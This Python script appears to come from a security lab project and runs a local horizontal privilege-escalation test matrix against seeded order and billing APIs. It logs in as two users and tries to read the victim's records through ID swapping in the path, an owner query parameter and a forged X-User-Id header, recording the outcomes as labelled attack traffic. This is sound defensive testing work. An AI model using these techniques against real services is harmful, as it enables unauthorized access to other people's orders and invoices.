"""Local-only horizontal privilege-escalation test matrix for API-Sentinel."""

import argparse
import sys
import time
from pathlib import Path
from urllib.parse import urlparse

import requests

PROJECT_ROOT = Path(__file__).resolve().parents[2]
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from scripts.attacks.attack_logger import AttackLogger
from scripts.traffic.customer_pool import build_customer_pool
from scripts.attacks.bola_attack import DEFAULT_BASE_URL, validate_base_url

TARGETS = {
    "order": {
        "port": 5003,
        "collection": "/api/v2/orders",
        "path_template": "/api/v2/orders/{id}",
        "owner_field": "user_id",
        "collection_key": "orders",
    },
    "billing": {
        "port": 5004,
        "collection": "/api/v2/billing/invoices",
        "path_template": "/api/v2/billing/invoices/{id}",
        "owner_field": "owner_id",
        "collection_key": "invoices",
    },
}

VECTORS = ("path_id", "query_param", "header_x_user_id", "body_tamper")
VERDICTS = {
    "ESCALATION_SUCCESS",
    "OWN_DATA_OR_IGNORED",
    "BLOCKED",
    "NOT_APPLICABLE",
    "ERROR",
}


def classify_object(status, body, attacker_id, owner_field):
    """Classify a single-object response by its returned owner."""
    if status in (401, 403, 404):
        return "BLOCKED"

    if status != 200 or not isinstance(body, dict):
        return "ERROR"

    owner_id = body.get(owner_field)
    if isinstance(owner_id, int) and not isinstance(owner_id, bool):
        return (
            "OWN_DATA_OR_IGNORED"
            if owner_id == attacker_id
            else "ESCALATION_SUCCESS"
        )

    return "ERROR"


def classify_collection(status, body, attacker_id, target):
    """Detect foreign-owned objects in a list response."""
    if status in (401, 403, 404):
        return "BLOCKED"

    if status != 200 or not isinstance(body, dict):
        return "ERROR"

    items = body.get(target["collection_key"])
    if not isinstance(items, list):
        return "ERROR"

    for item in items:
        if not isinstance(item, dict):
            return "ERROR"
        owner_id = item.get(target["owner_field"])
        if isinstance(owner_id, bool) or not isinstance(owner_id, int):
            return "ERROR"
        if owner_id != attacker_id:
            return "ESCALATION_SUCCESS"

    return "OWN_DATA_OR_IGNORED"


class PrivEscAttack:
    def __init__(
        self,
        base_url=DEFAULT_BASE_URL,
        output_dir=None,
        timeout=5,
        session=None,
        logger=None,
    ):
        self.base_url = validate_base_url(base_url)
        self.timeout = timeout
        self.session = session or requests.Session()
        self.logger = logger or AttackLogger(
            "privesc_attack", output_dir=output_dir
        )

    def close(self):
        self.logger.close()

    def _url(self, port, path):
        return f"{self.base_url}:{port}{path}"

    def login(self, customer):
        response = self.session.post(
            self._url(5001, "/api/v2/auth/login"),
            json={
                "username": customer.username,
                "password": customer.password,
            },
            timeout=self.timeout,
        )
        if response.status_code != 200:
            raise RuntimeError(
                f"Login failed for {customer.username}: HTTP "
                f"{response.status_code}"
            )

        try:
            body = response.json()
            user_id = body["user_id"]
            token = body["token"]
        except (ValueError, KeyError, TypeError) as exc:
            raise RuntimeError("Invalid login response") from exc

        if isinstance(user_id, bool) or not isinstance(user_id, int):
            raise RuntimeError("Login response has an invalid user_id")
        if not isinstance(token, str) or not token:
            raise RuntimeError("Login response has an invalid token")

        return user_id, {"Authorization": f"Bearer {token}"}

    def _get_victim_resource_id(self, target, victim_headers):
        """Use the victim's own list to select a real object ID."""
        response = self.session.get(
            self._url(target["port"], target["collection"]),
            headers=victim_headers,
            timeout=self.timeout,
        )
        if response.status_code != 200:
            raise RuntimeError(
                f"Could not list victim's {target['collection_key']}: "
                f"HTTP {response.status_code}"
            )

        try:
            items = response.json()[target["collection_key"]]
            resource_id = items[0]["id"]
        except (ValueError, KeyError, IndexError, TypeError) as exc:
            raise RuntimeError(
                f"Could not find a victim-owned {target['collection_key']} "
                "for the test"
            ) from exc

        if isinstance(resource_id, bool) or not isinstance(resource_id, int):
            raise RuntimeError("Victim resource has an invalid ID")

        return resource_id

    def _record(
        self,
        *,
        target_name,
        vector,
        path,
        attacker_id,
        headers,
        victim_id,
        resource_id=None,
        params=None,
    ):
        started = time.monotonic()
        status = None
        body = None
        error = None

        try:
            response = self.session.get(
                self._url(TARGETS[target_name]["port"], path),
                headers=headers,
                params=params,
                timeout=self.timeout,
            )
            status = response.status_code
            try:
                body = response.json()
            except ValueError:
                body = None

            target = TARGETS[target_name]
            if vector == "path_id":
                verdict = classify_object(
                    status, body, attacker_id, target["owner_field"]
                )
            else:
                verdict = classify_collection(
                    status, body, attacker_id, target
                )

        except requests.RequestException as exc:
            verdict = "ERROR"
            error = type(exc).__name__

        record = {
            "label": verdict,
            "verdict": verdict,
            "traffic_label": "ATTACK",
            "target": target_name,
            "vector": vector,
            "route": path,
            "attacker_id": attacker_id,
            "victim_id": victim_id,
            "resource_id": resource_id,
            "http_status": status,
            "status": status,
            "duration_ms": round((time.monotonic() - started) * 1000, 3),
        }
        if error:
            record["error"] = error

        self.logger.log(**record)
        return record

    def _not_applicable(self, target_name, attacker_id, victim_id):
        """Both tested object routes are GET-only; don't send a body."""
        record = {
            "label": "NOT_APPLICABLE",
            "verdict": "NOT_APPLICABLE",
            "traffic_label": "ATTACK",
            "target": target_name,
            "vector": "body_tamper",
            "route": TARGETS[target_name]["path_template"],
            "attacker_id": attacker_id,
            "victim_id": victim_id,
            "resource_id": None,
            "http_status": None,
            "status": None,
            "duration_ms": 0,
            "reason": "The tested routes are GET-only; no body was sent.",
        }
        self.logger.log(**record)
        return record

    def run_matrix(
        self, attacker_id, attacker_headers, victim_id, victim_headers
    ):
        results = []

        for target_name, target in TARGETS.items():
            resource_id = self._get_victim_resource_id(
                target, victim_headers
            )
            object_path = target["path_template"].format(id=resource_id)

            # 1. Change the object identifier in the path.
            results.append(
                self._record(
                    target_name=target_name,
                    vector="path_id",
                    path=object_path,
                    attacker_id=attacker_id,
                    headers=attacker_headers,
                    victim_id=victim_id,
                    resource_id=resource_id,
                )
            )

            # 2. Tamper with the owner filter on the collection endpoint.
            results.append(
                self._record(
                    target_name=target_name,
                    vector="query_param",
                    path=target["collection"],
                    attacker_id=attacker_id,
                    headers=attacker_headers,
                    victim_id=victim_id,
                    params={target["owner_field"]: victim_id},
                )
            )

            # 3. Supply a forged identity header.
            forged_headers = {
                **attacker_headers,
                "X-User-Id": str(victim_id),
            }
            results.append(
                self._record(
                    target_name=target_name,
                    vector="header_x_user_id",
                    path=target["collection"],
                    attacker_id=attacker_id,
                    headers=forged_headers,
                    victim_id=victim_id,
                )
            )

            # 4. Both tested routes are GET-only.
            results.append(
                self._not_applicable(
                    target_name, attacker_id, victim_id
                )
            )

        return results


def print_summary(results):
    print("\nHorizontal privilege-escalation matrix")
    print("-" * 72)
    print(f"{'Vector':<22} {'Order':<24} {'Billing':<24}")
    print("-" * 72)

    by_cell = {(r["vector"], r["target"]): r["verdict"] for r in results}
    for vector in VECTORS:
        print(
            f"{vector:<22} "
            f"{by_cell.get((vector, 'order'), 'MISSING'):<24} "
            f"{by_cell.get((vector, 'billing'), 'MISSING'):<24}"
        )

    print(f"\nRequests recorded: {len(results)}")
    print(
        "Escalation successes: "
        f"{sum(r['verdict'] == 'ESCALATION_SUCCESS' for r in results)}"
    )


def parse_args():
    parser = argparse.ArgumentParser(
        description="Run a local horizontal privilege-escalation matrix."
    )
    parser.add_argument("--attacker", help="Attacker's seeded username")
    parser.add_argument("--victim", help="Victim's seeded username")
    parser.add_argument("--base-url", default=DEFAULT_BASE_URL)
    parser.add_argument("--output-dir", help="Separate directory for JSONL evidence")
    parser.add_argument("--timeout", type=float, default=5)
    return parser.parse_args()


def main():
    args = parse_args()
    try:
        validate_base_url(args.base_url)
        if args.timeout <= 0:
            raise ValueError("--timeout must be greater than zero")

        pool = build_customer_pool()
        by_name = {customer.username: customer for customer in pool}

        attacker_name = args.attacker or pool[0].username
        victim_name = args.victim or (
            pool[1].username if len(pool) > 1 else None
        )
        if not victim_name:
            raise RuntimeError("At least two seeded customers are required")
        if attacker_name == victim_name:
            raise ValueError("Attacker and victim must be different users")
        if attacker_name not in by_name or victim_name not in by_name:
            raise ValueError(
                "Unknown username. Choose users from the seeded customer pool."
            )

        attack = PrivEscAttack(
            base_url=args.base_url,
            output_dir=args.output_dir,
            timeout=args.timeout,
        )
        try:
            attacker_id, attacker_headers = attack.login(
                by_name[attacker_name]
            )
            victim_id, victim_headers = attack.login(by_name[victim_name])
            if attacker_id == victim_id:
                raise RuntimeError("Attacker and victim resolved to the same ID")

            print(f"Attacker: {attacker_name} (ID {attacker_id})")
            print(f"Victim:   {victim_name} (ID {victim_id})")
            results = attack.run_matrix(
                attacker_id,
                attacker_headers,
                victim_id,
                victim_headers,
            )
            print_summary(results)
            print(f"Evidence: {attack.logger.path}")
        finally:
            attack.close()

    except (ValueError, RuntimeError) as exc:
        print(f"ERROR: {exc}", file=sys.stderr)
        return 1

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
